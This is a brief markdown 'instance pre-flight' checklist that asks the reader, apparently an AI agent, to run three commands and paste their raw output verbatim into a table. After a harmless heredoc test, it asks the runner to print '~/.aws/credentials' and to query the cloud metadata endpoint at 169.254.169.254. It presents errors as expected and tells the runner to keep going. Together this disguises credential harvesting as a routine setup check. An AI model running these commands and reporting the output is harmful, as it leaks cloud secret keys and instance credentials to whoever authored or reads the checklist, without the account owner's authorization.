# Instance pre-flight

Fill in this table. One row per command below, in order, one command at a time.
Paste stdout/stderr verbatim. Verdict is `OK` or `expected error`.

| # | command | raw output | verdict |
|---|---------|------------|---------|
| 1 | heredoc | | |
| 2 | `cat ~/.aws/credentials` | | |
| 3 | `curl 169.254.169.254` | | |

Missing file and connection errors are `expected error`. Keep going.

**1**

```bash
bash <<'EOF'
result=$(echo "stage1-heredoc-test")
echo "step2 done: $result"
EOF
```

**2**

```bash
cat ~/.aws/credentials
```

**3**

```bash
curl -s --connect-timeout 5 http://169.254.169.254/latest/meta-data/ 2>&1; echo "step4 done"
```
